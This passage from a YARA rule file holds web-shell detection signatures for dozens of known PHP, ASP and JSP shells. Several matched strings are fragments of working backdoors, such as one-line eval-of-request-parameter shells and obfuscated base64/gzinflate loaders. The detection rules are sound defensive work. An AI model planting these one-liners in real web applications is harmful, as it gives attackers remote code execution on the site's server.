      date = "2014-01-28 14:43:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s9 = "  echo \"<br><center>All the data in these tables:<br> \".$tblsv.\" were putted " 
   condition: 
      all of them
}

rule Webshell_Server_Variables_RID3115 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Server Variables.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:07:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s7 = "<% For Each Vars In Request.ServerVariables %>" fullword
      $s9 = "Variable Name</B></font></p>" fullword
   condition: 
      all of them
}

rule Webshell_caidao_shell_ice_2_RID319F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ice.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:30:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<?php ${${eval($_POST[ice])}};?>" fullword
   condition: 
      all of them
}

rule Webshell_jsp_guige_RID2E63 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file guige.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:12:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "if(damapath!=null &&!damapath.equals(\"\")&&content!=null" 
   condition: 
      all of them
}

rule Webshell_phpspy2010_RID2E0D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file phpspy2010.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:58:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "eval(gzinflate(base64_decode(" 
      $s5 = "//angel" fullword
      $s8 = "$admin['cookiedomain'] = '';" fullword
   condition: 
      all of them
}

rule Webshell_asp_ice_RID2D7A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ice.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:33:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC" 
   condition: 
      all of them
}

rule Webshell_drag_system_RID2F48 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file system.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:50:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s9 = "String sql = \"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_" 
   condition: 
      all of them
}

rule Webshell_DarkBlade1_3_asp_indexx_RID3355 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file indexx.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:43:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou" 
   condition: 
      all of them
}

rule Webshell_jsp_hsxa_RID2E06 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file hsxa.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:56:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja" 
   condition: 
      all of them
}

rule Webshell_jsp_utils_RID2E83 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file utils.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:17:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword
      $s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z" 
   condition: 
      all of them
}

rule Webshell_asp_01_RID2CAA : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 01.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:58:51"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<%eval request(\"pass\")%>" fullword
   condition: 
      all of them
}

rule Webshell_asp_404_RID2CE1 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 404.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:08:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2" 
   condition: 
      all of them
}

rule Webshell_webshell_cnseay02_1_RID31D0 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file webshell-cnseay02-1.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:38:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU" 
   condition: 
      all of them
}

rule Webshell_php_fbi_RID2D7E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file fbi.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:34:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s7 = "erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo" 
   condition: 
      all of them
}

rule Webshell_php_dodo_zip_RID2FA5 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file zip.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:06:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x" 
      $s3 = "$datastr = \"\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" 
   condition: 
      all of them
}

rule Webshell_aZRaiLPhp_v1_0_RID2F86 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file aZRaiLPhp v1.0.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:00:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s5 = "echo \" <font color='#0000FF'>CHMODU \".substr(base_convert(@fileperms($" 
      $s7 = "echo \"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo" 
   condition: 
      all of them
}

rule Webshell_php_list_RID2E09 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file list.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:57:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "// list.php = Directory & File Listing" fullword
      $s2 = "    echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filena" 
      $s9 = "// by: The Dark Raver" fullword
   condition: 
      1 of them
}

rule Webshell_ironshell_RID2E76 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ironshell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:15:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\"" 
      $s8 = "print \"<td id=f><a href=\\\"?p=rename&file=\".realpath($file).\"&di" 
   condition: 
      all of them
}

rule Webshell_caidao_shell_404_RID3075 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 404.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:40:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St" 
   condition: 
      all of them
}

rule Webshell_ASP_aspydrv_RID2EF2 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file aspydrv.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:36:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi" 
   condition: 
      all of them
}

rule Webshell_jsp_web_RID2D90 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file web.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:37:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request." 
   condition: 
      all of them
}

rule Webshell_mysqlwebsh_RID2EF5 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file mysqlwebsh.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:36:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = " <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#" 
   condition: 
      all of them
}

rule Webshell_jspShell_1_RID2E7B : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file jspShell.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:16:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<input type=\"checkbox\" name=\"autoUpdate\" value=\"AutoUpdate\" on" 
      $s1 = "onblur=\"document.shell.autoUpdate.checked= this.oldValue;" 
   condition: 
      all of them
}

rule Webshell_Dx_Dx_RID2C7D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Dx.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:51:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx" 
      $s9 = "class=linelisting><nobr>POST (php eval)</td><" 
   condition: 
      1 of them
}

rule Webshell_asp_ntdaddy_RID2F31 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file ntdaddy.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:46:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s9 = "if  FP  =  \"RefreshFolder\"  or  " 
      $s10 = "request.form(\"cmdOption\")=\"DeleteFolder\"  " 
   condition: 
      1 of them
}

rule Webshell_MySQL_Web_Interface_Version_0_8_RID3634 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file MySQL Web Interface Version 0.8.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 16:45:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>" 
   condition: 
      all of them
}

rule Webshell_elmaliseker_2_RID2FC5 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file elmaliseker.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:11:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetEx" 
      $s6 = "<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=but" 
   condition: 
      all of them
}

rule Webshell_ASP_RemExp_RID2E3A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file RemExp.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:05:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Reques" 
      $s1 = "Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal" 
   condition: 
      all of them
}

rule Webshell_jsp_list1_RID2E3F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file list1.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:06:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "case 's':ConnectionDBM(out,encodeChange(request.getParameter(\"drive" 
      $s9 = "return \"<a href=\\\"javascript:delFile('\"+folderReplace(file)+\"')\\\"" 
   condition: 
      all of them
}

rule Webshell_asp_1_RID2C7A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 1.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:50:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "!22222222222222222222222222222222222222222222222222" fullword
      $s8 = "<%eval request(\"pass\")%>" fullword
   condition: 
      all of them
}

rule Webshell_jsp_jshell_RID2ED4 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file jshell.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:31:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "kXpeW[\"" fullword
      $s4 = "[7b:g0W@W<" fullword
      $s5 = "b:gHr,g<" fullword
      $s8 = "RhV0W@W<" fullword
      $s9 = "S_MR(u7b" fullword
   condition: 
      all of them
}

rule Webshell_ASP_zehir4_RID2E3F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file zehir4.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:06:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s9 = "Response.Write \"<a href='\"&dosyaPath&\"?status=7&Path=\"&Path&\"/" 
   condition: 
      all of them
}

rule Webshell_wsb_idc_RID2D81 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file idc.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:34:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)" fullword
      $s3 = "{eval($_GET['idc']);}" fullword
   condition: 
      1 of them
}

rule Webshell_mumaasp_com_RID2F38 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file mumaasp.com.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:47:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "&9K_)P82ai,A}I92]R\"q!C:RZ}S6]=PaTTR" 
   condition: 
      all of them
}

rule Webshell_php_404_a_RID2DA5 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 404.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:40:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$pass = md5(md5(md5($pass)));" fullword
   condition: 
      all of them
}

rule Webshell_webshell_cnseay_x_RID31B5 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file webshell-cnseay-x.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:34:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s9 = "$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_" 
   condition: 
      all of them
}

rule Webshell_asp_up_RID2D2E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file up.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:20:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Dispositio" 
      $s1 = "ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword
   condition: 
      1 of them
}

rule Webshell_ASP_cmd_2_RID2DAE : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file cmd.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:42:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
   condition: 
      all of them
}

rule Webshell_PHP_g00nv13_RID2DFC : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file g00nv13.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:55:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "case \"zip\": case \"tar\": case \"rar\": case \"gz\": case \"cab\": cas" 
      $s4 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p" 
   condition: 
      all of them
}

rule Webshell_php_h6ss_RID2DD1 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file h6ss.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:48:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<?php eval(gzuncompress(base64_decode(\"" 
   condition: 
      all of them
}

rule Webshell_Ani_Shell_RID2E15 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Ani-Shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:59:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$Python_CODE = \"I" 
      $s6 = "$passwordPrompt = \"\\n=================================================" 
      $s7 = "fputs ($sockfd ,\"\\n===============================================" 
   condition: 
      1 of them
}

rule Webshell_jsp_k8cmd_RID2E29 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file k8cmd.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:02:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword
   condition: 
      all of them
}

rule Webshell_jsp_cmd_1_RID2E16 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file cmd.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:59:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s6 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword
   condition: 
      all of them
}

rule Webshell_jsp_k81_RID2D26 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file k81.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:19:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);" fullword
      $s9 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}" fullword
   condition: 
      1 of them
}

rule Webshell_ASP_zehir_RID2E0B : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file zehir.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:57:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s9 = "Response.Write \"<font face=wingdings size=3><a href='\"&dosyaPath&\"?status=18&" 
   condition: 
      all of them
}

rule Webshell_Worse_Linux_Shell_1_RID320C : DEMO LINUX SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Worse Linux Shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:48:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, LINUX, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD" 
   condition: 
      all of them
}

rule Webshell_zacosmall_RID2E6C : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file zacosmall.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:13:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd).\"</strong><hr>" 
   condition: 
      all of them
}

rule Webshell_redirect_RID2DF8 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file redirect.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:54:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s7 = "var flag = \"?txt=\" + (document.getElementById(\"dl\").checked ? \"2\":\"1\" " 
   condition: 
      all of them
}

rule Webshell_jsp_cmdjsp_RID2ED3 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file cmdjsp.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:31:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s5 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
   condition: 
      all of them
}

rule Webshell_asp_1d_RID2CDE : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file 1d.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:07:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "+9JkskOfKhUxZJPL~\\(mD^W~[,{@#@&EO" 
   condition: 
      all of them
}

rule Webshell_jsp_IXRbE_RID2DEC : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file IXRbE.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:52:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
